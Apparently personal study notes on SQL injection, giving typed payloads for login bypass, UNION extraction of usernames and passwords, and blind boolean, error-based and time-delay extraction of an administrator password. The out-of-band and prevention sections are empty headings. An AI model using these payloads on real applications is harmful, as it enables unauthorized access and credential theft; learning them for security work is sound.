# SQL injection 

## Theory 

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

## Impact of successful SQL injection attack

- Password
- Credit card detail
- Personal user infomation

SQL injection attacks have been used in many high-profile data breaches over the years. These have caused reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.

## Types of SQL injection attacks

### Retrieving hidden data

Modify SQL query to return additional results.

- Add `AND` to release more infomation from database.
- Browser request the URL: `https://insecure-website.com/products?category=Gifts`.

```SQL
-- Without AND query
SELECT * FROM products WHERE category = Gifts;

-- AND query
SELECT * FROM products WHERE category = 'Gifts' AND (additional query);

-- Additional query: ' AND () --
```

Use comment in SQL injection `--` to remove sth not effectively or display all product combine `OR 1=1` always return TRUE.

```SQL
-- First query display product with category Gifts and is being release
SELECT * FROM product WHERE category = 'Gifts' AND release = 1;

-- Query with comment and OR to display all product in any category, including categories that they don't know about.
SELECT * FROM product WHERE category = 'Gifts' OR 1=1 --' AND release = 1; 

-- Additional query: ' OR 1=1 --
```

### Subverting application logic

Example an application lets users login with username and password. If user submit the username `admin` and password `admin`, the application check the credentials by SQL query: 

```SQL
-- Initial query
SELECT * FROM users WHERE username = 'admin' AND password = 'admin';

-- Query with subverting application logic
SELECT * FROM users WHERE username = 'admin' -- AND password = 'admin';

-- Additional query: admin' --
```

- This query returns the users `admin` and successfully login without password.

### Union attack

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:
 
```SQL
SELECT a,b FROM table1 UNION SELECT c,d FROM table2;
```

- This initials SQL query return 2 columns a,b from table1 and 2 columns c,d from table2.

To use `UNION` query, to key requirement must be set:

- The individual query must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out SQL UNION attack, make sure that your attack meets these two requirements.
 
- Finding out how much columns are returned from original query.
- Which columns has the same data types to hold the results from the injected query.

#### Determining the number of columns required.

- Using `ORDER BY`

```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

- Using `UNION SLECT + NULL`

```SQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

- If the number of nulls does not match the number of columns, the database returns an error.

We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

#### Database-specific syntax

On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

```SQL
' UNION SELECT NULL FROM DUAL--
```

The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.

- [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

#### Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

```SQL
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

- If the column data type is not compatible with string data, the injected query will cause a database error

- If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

#### Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

```SQL
-- This uses the double-pipe sequence || which is a string concatenation operator on Oracle.
' UNION SELECT username || '~' || password FROM users--
```

### Blind SQL injection

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

#### Exploiting blind SQL injection by triggering conditional responses

```SQL
-- Initial query
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4';

-- Additional query with logic
u5YD3PapBcR4lN3e7Tj4' AND '1'='1 -- return TRUE
u5YD3PapBcR4lN3e7Tj4' AND '1'='2 -- return FALSE
```

- From here we can use SUBSTRING in combination with boolean to check the length and check each character of the password to see if it is correct.

```SQL
-- Indicating that the injected condition is true, and so the first character of the password is greater than m
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

-- Indicating that the injected condition is true, and so the first character of the password is equal m
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
```

### Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.

#### Exploiting blind SQL injection by triggering conditional errors

```SQL
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

- With the first input, the CASE expression evaluates to `a`, which does not cause any error.
- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

- We can use this error to check one of character in password is equal to `a`.

```SQL
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

#### Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker.

This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a WHERE statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

- You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

```SQL
-- initial query
CAST((SELECT example_column FROM example_table) AS int)

-- error message
ERROR: invalid input syntax for type integer: "Example data"
```

#### Exploiting blind SQL injection by triggering time delays

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.

```SQL
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

-- Using time delay to checking one of character in password
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

```

#### Exploiting blind SQL injection using out-of-band (OAST) techniques



## How to prevent SQL injection
















